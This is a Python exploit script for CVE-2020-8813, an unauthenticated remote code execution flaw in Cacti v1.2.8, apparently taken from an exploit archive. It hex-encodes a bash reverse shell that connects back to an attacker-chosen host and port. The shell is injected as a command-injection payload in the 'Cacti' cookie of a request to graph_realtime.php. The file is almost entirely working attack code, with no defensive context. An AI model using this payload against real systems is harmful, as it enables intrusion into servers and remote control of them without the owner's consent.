#!/usr/bin/python3
# Exploit Title: Cacti v1.2.8 Unauthenticated Remote Code Execution
# Date: 04/21/2021
# Exploit Author: (m4ud)
# CVE: CVE-2020-8813
# Vendor Homepage: https://cacti.net/
# Version: v1.2.8
# Tested on: CentOS 7.3,Ubuntu 16.04, Debian9, Debian 10 / PHP 7.1.33, PHP 7.0
import requests
import sys
import warnings
from bs4 import BeautifulSoup
from urllib.parse import quote
import binascii
warnings.filterwarnings("ignore", category=UserWarning, module='bs4')


if len(sys.argv) != 4:

    print("[~] Create reverse shell for Upload.\r\n[~] Start WebServer on Port 80\r\n[~] Usage : ./Cacti-exploit.py URL LHOST LPORT")

    exit()

url = sys.argv[1]
ip = sys.argv[2]
port = sys.argv[3]
#proxy = "http://127.0.0.1:8080"
#proxies = { "http" : proxy }

shell = "bash -i >&/dev/tcp/%s/%s 0>&1" % (ip, port)
v = binascii.hexlify(bytes(shell, encoding='utf-8')).decode("utf-8") 
def send_exploit(url):
    payload = ";echo${IFS}" + v + "|xxd${IFS}-p${IFS}-r|bash"
    print(payload)
    cookies = {'Cacti': quote(payload)}
    path = url+"/graph_realtime.php?action=init"
    print("[+] S3nd1ng 3v1l r3qu3st, SHELL????")
    print("[+] Burn1ng C4ct1!!")
#    requests.get(path, cookies=cookies, proxies=proxies)
    requests.get(path, cookies=cookies)

send_exploit(url)


